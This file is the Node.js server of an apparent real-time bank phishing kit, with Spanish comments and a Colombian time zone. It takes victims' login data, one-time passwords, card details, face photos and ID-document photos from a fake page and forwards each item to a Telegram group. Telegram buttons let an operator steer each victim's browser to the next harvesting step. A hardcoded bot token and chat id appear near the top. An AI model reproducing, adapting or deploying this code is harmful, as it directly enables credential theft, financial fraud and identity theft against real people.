const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});
const TelegramBot = require('node-telegram-bot-api');

const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
const chatId = '-1002984980722';

// Configuración del bot con manejo de errores
const bot = new TelegramBot(botToken, { 
    polling: true,
    filepath: false // Deshabilitar el guardado de archivos
});

// Manejar errores del bot
bot.on('polling_error', (error) => {
    console.log('Error de polling:', error);
});

bot.on('error', (error) => {
    console.log('Error general del bot:', error);
});

// Middleware
app.use(express.static(__dirname));
app.use(express.json());

// Almacenar las sesiones activas
const sessions = new Map();

io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    let currentSessionId = null;

    socket.on('initSession', ({ sessionId }) => {
        console.log('Iniciando sesión:', sessionId);
        currentSessionId = sessionId;
        sessions.set(sessionId, {
            socketId: socket.id,
            lastActive: Date.now()
        });
        socket.emit('sessionConfirmed', { sessionId });
    });

    socket.on('sendData', async (data) => {
        try {
            const { type, content, sessionId } = data;
            console.log('Recibiendo datos:', type, 'de sesión:', sessionId);

            // Actualizar timestamp de actividad y guardar el socket ID
            sessions.set(sessionId, {
                socketId: socket.id,
                lastActive: Date.now()
            });

            // Confirmar recepción al cliente inmediatamente
            socket.emit('dataSent', { success: true });

            // Preparar mensaje para Telegram
            let message = '🔵 Nueva información recibida\n\n';
            
            // Opciones de botones comunes
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "1️⃣ Pedir Logo", callback_data: `index_${sessionId}` },
                        { text: "2️⃣ Pedir OTP", callback_data: `dinamica_${sessionId}` }
                    ],
                    [
                        { text: "3️⃣ Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
                        { text: "4️⃣ Pedir Cara", callback_data: `terminos_${sessionId}` }
                    ],
                    [
                        { text: "5️⃣ Pedir Cédula", callback_data: `cedula_${sessionId}` },
                        { text: "6️⃣ Finalizar", callback_data: `finalizar_${sessionId}` }
                    ]
                ]
            };
            
            // Preparar el mensaje según el tipo de datos
            switch(type) {
                case 'login':
                    message += '📱 Datos de inicio\n';
                    break;
                case 'dinamica':
                    message += '🔑 Clave dinámica\n';
                    break;
                case 'terminos':
                    message += '📋 Términos aceptados\n';
                    break;
                case 'face':
                    message += '👤 Foto de rostro\n';
                    break;
                case 'document':
                    message += '📄 Foto de documento\n';
                    break;
                case 'tarjeta':
                    message += '💳 Datos de tarjeta\n';
                    break;
            }

            message += `⌚ Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}\n`;
            
            if (content.text) {
                message += `\n${content.text}`;
            }

            try {
                // Si hay imagen, enviarla primero con el texto y los botones
                if (content.image) {
                    const imageBuffer = Buffer.from(content.image.split(',')[1], 'base64');
                    await bot.sendPhoto(chatId, imageBuffer, {
                        caption: message,
                        reply_markup: keyboard
                    });
                } else {
                    // Si no hay imagen, enviar solo el mensaje con los botones
                    await bot.sendMessage(chatId, message, {
                        reply_markup: keyboard
                    });
                }

                // Confirmar éxito al cliente
                socket.emit('dataSent', { success: true });
                
            } catch (sendError) {
                console.error('Error al enviar a Telegram:', sendError);
                socket.emit('error', { 
                    message: 'Error al enviar datos',
                    details: sendError.message 
                });
                
                // Intentar enviar mensaje de error al grupo
                try {
                    await bot.sendMessage(chatId, '❌ Error al procesar el envío de datos');
                } catch (notificationError) {
                    console.error('Error al enviar notificación de error:', notificationError);
                }
            }

        } catch (error) {
            console.error('Error general en sendData:', error);
            socket.emit('error', { 
                message: 'Error general en el procesamiento de datos',
                details: error.message 
            });
        }
    });

    // Manejar desconexión
    socket.on('disconnect', () => {
        if (currentSessionId) {
            console.log('Cliente desconectado, sesión:', currentSessionId);
            sessions.delete(currentSessionId);
        }
    });
});

// Manejar botones de Telegram
bot.on('callback_query', async (callbackQuery) => {
    try {
        const [action, sessionId] = callbackQuery.data.split('_');
        console.log('Acción recibida:', action, 'para sesión:', sessionId);

        // Confirmar recepción del callback inmediatamente
        await bot.answerCallbackQuery(callbackQuery.id);

        const session = sessions.get(sessionId);
        if (session) {
            // Emitir la acción solo al socket específico
            const socket = io.sockets.sockets.get(session.socketId);
            if (socket) {
                socket.emit('telegramAction', { action });
                console.log('Acción enviada al socket:', session.socketId);
            }

            // Actualizar último momento activo
            session.lastActive = Date.now();

            // Confirmar acción con mensaje
            let confirmMessage = '✅ ';
            switch(action) {
                case 'index':
                    confirmMessage += 'Redirigiendo al inicio...';
                    break;
                case 'dinamica':
                    confirmMessage += 'Solicitando OTP...';
                    break;
                case 'terminos':
                    confirmMessage += 'Solicitando foto...';
                    break;
                case 'tarjeta':
                    confirmMessage += 'Solicitando datos de tarjeta...';
                    break;
                case 'cedula':
                    confirmMessage += 'Solicitando documento...';
                    break;
                case 'finalizar':
                    confirmMessage += 'Finalizando sesión...';
                    break;
            }

            // Enviar mensaje de confirmación
            await bot.sendMessage(chatId, confirmMessage);
        } else {
            console.log('Sesión no encontrada:', sessionId);
            await bot.sendMessage(chatId, '⚠️ Sesión no encontrada');
        }

    } catch (error) {
        console.error('Error en callback_query:', error);
        try {
            await bot.sendMessage(chatId, '❌ Error al procesar la acción');
        } catch (sendError) {
            console.error('Error al enviar mensaje de error:', sendError);
        }
    }
});

// Limpieza de sesiones inactivas
setInterval(() => {
    const now = Date.now();
    for (let [sessionId, data] of sessions.entries()) {
        if (now - data.lastActive > 15 * 60 * 1000) { // 15 minutos
            console.log('Limpiando sesión inactiva:', sessionId);
            sessions.delete(sessionId);
        }
    }
}, 5 * 60 * 1000);

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});